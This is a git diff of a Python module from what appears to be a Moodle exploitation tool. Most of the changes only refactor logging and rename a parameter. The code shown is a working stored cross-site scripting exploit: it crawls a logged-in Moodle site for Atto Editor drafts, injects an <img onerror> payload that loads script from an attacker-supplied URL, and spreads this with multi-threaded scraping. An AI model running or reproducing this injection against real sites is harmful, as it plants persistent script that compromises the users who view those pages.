@@ -22,6 +22,8 @@ from gc import collect
 from threading import Thread
 from bs4 import BeautifulSoup
 
+from utils.output import *
+
 # global vars
 base_url = ''
 pages = []
@@ -47,15 +49,15 @@ class ThreadReturn(Thread):
 
 
 # parse Moodle links from an HTML page
-def scrape(parent_url, sess, payload, verbose, check_mode=False):
+def scrape(parent_url, sess, payload, verbosity, check_mode=False):
 	global pages, found
 	
 	# avoid scraping off-scope/non-php links or accidentally logging out
 	filename = parent_url.split('?', 1)[0]
 	if filename.endswith('logout.php') or (filename != base_url and not filename.endswith('/') and not filename.endswith('.php')): return []
 	
-	if verbose > 2:
-		print('[i] Scraper: scraping links from "{}"'.format(parent_url))
+	if verbosity > 2:
+		print_info('Scraper: scraping links from "{}"'.format(parent_url))
 	
 	# get page content
 	content = sess.get(parent_url).text
@@ -63,7 +65,7 @@ def scrape(parent_url, sess, payload, verbose, check_mode=False):
 	
 	# check for an Atto Editor element in page content and try to inject payload into it
 	if '"pageHash":"' in content:
-		print('[*] Atto Editor found on "{}", injecting payload...'.format(parent_url))
+		print_status('Atto Editor found on "{}", injecting payload...'.format(parent_url))
 		injection = inject(content, sess, payload, check_mode)
 		
 		# if in check mode, scraping can stop and result of injection is returned
@@ -98,7 +100,7 @@ def inject(content, sess, payload, check_mode):
 		elementid = content.split('"elementid":"')[1].split('"')[0]
 		draftid = content.split('"itemid":')[1].split('}')[0]
 	except IndexError:
-		print('[X] Error retrieving Atto Editor element')
+		print_error('Error retrieving Atto Editor element')
 		return False
 	
 	# first request: initialize draft or restore previous
@@ -137,7 +139,7 @@ def inject(content, sess, payload, check_mode):
 	)
 	
 	if inject.status_code != 200 or inject.text != '[null]':
-		print('[X] Error injecting payload')
+		print_error('Error injecting payload')
 		return False
 	
 	# third request: retrieve draft and check if the payload has been injected successfully
@@ -159,10 +161,10 @@ def inject(content, sess, payload, check_mode):
 	
 	# if the payload is found in the restored draft, it has been injected successfully
 	if res.status_code != 200 or loads(res.text)[0]['result'] != payload:
-		print('[X] Payload not injected correctly')
+		print_error('Payload not injected correctly')
 		return False
 	
-	print('[+] Payload injected correctly')
+	print_success('Payload injected correctly')
 	
 	# if in check mode remove payload from draft
 	if check_mode:
@@ -182,21 +184,21 @@ def inject(content, sess, payload, check_mode):
 			}
 		)
 		
-		print('[+] Removed payload from draft')
+		print_success('Removed payload from draft')
 	
 	return True
 
 
 # perform a quick check if an Atto Editor element is on user profile edit page, with no scraping necessary
 def quick_check(sess, payload):
-	print('[*] Trying to retrieve Atto Editor element from user profile edit page')
+	print_status('Trying to retrieve Atto Editor element from user profile edit page')
 	
 	content = sess.get(base_url+'/user/edit.php').text
 	if '"pageHash":"' not in content:
-		print('[-] Atto Editor element not found in user profile edit page')
+		print_warning('Atto Editor element not found in user profile edit page')
 		return False
 	
-	print('[*] Atto Editor found on user profile edit page, injecting payload...')
+	print_status('Atto Editor found on user profile edit page, injecting payload...')
 	return inject(content, sess, payload, True)
 
 # check mode: try to inject payload in a draft just once and then reset it
@@ -204,7 +206,7 @@ def check(args, sess, version):
 	global base_url
 	
 	if args.auth is None:
-		print('[-] Vulnerability "{}" requires authentication, skipping...'.format(name))
+		print_warning('Vulnerability "{}" requires authentication, skipping...'.format(name))
 		return False
 	
 	base_url = args.url
@@ -215,12 +217,12 @@ def check(args, sess, version):
 		return True
 	
 	# single-threaded scraping to avoid invasive traffic and handle results better
-	print('[*] Finding an Atto Editor element on "{}"'.format(args.url))
-	links = scrape(args.url, sess, payload, args.verbose, True)
+	print_status('Finding an Atto Editor element on "{}"'.format(args.url))
+	links = scrape(args.url, sess, payload, args.verbosity, True)
 	
 	# extract links from pages content until there are none left
 	while True:
-		spool = [scrape(link, sess, payload, args.verbose, True) for link in links if not found]
+		spool = [scrape(link, sess, payload, args.verbosity, True) for link in links if not found]
 		
 		if found:
 			return spool[-1]
@@ -238,7 +240,7 @@ def check(args, sess, version):
 		# clean memory
 		collect()
 	
-	print('[-] No Atto Editor element was found')
+	print_warning('No Atto Editor element was found')
 	return False
 
 # exploit mode: multi-threaded scrape for any injectable Atto Editor element in moodle and save payload into it
@@ -254,8 +256,8 @@ def exploit(args, sess, version):
 	payload = '<img src=x style="display:none" onerror="var s=document.createElement(\'script\'); s.src=\'{}\'; document.body.appendChild(s);">'.format(script_url)
 	
 	# multi-threaded scraping for improving performance in exploitation mode
-	print('[*] Scraping Moodle on "{}"'.format(args.url))
-	links = scrape(args.url, sess, payload, args.verbose)
+	print_status('Scraping Moodle on "{}"'.format(args.url))
+	links = scrape(args.url, sess, payload, args.verbosity)
 	
 	
 	# extract links from pages content until there are none left
@@ -269,7 +271,7 @@ def exploit(args, sess, version):
 				spool2.append(link)
 				continue
 			
-			threads = [ThreadReturn(target = scrape, args = (x, sess, payload, args.verbose)) for x in spool2]
+			threads = [ThreadReturn(target = scrape, args = (x, sess, payload, args.verbosity)) for x in spool2]
 			for thread in threads: thread.start()
 			for thread in threads: spool += thread.join()
 			
@@ -291,4 +293,4 @@ def exploit(args, sess, version):
 		
 		collect()
 	
-	print('[+] Moodle scraping complete')
+	print_success('Moodle scraping complete')
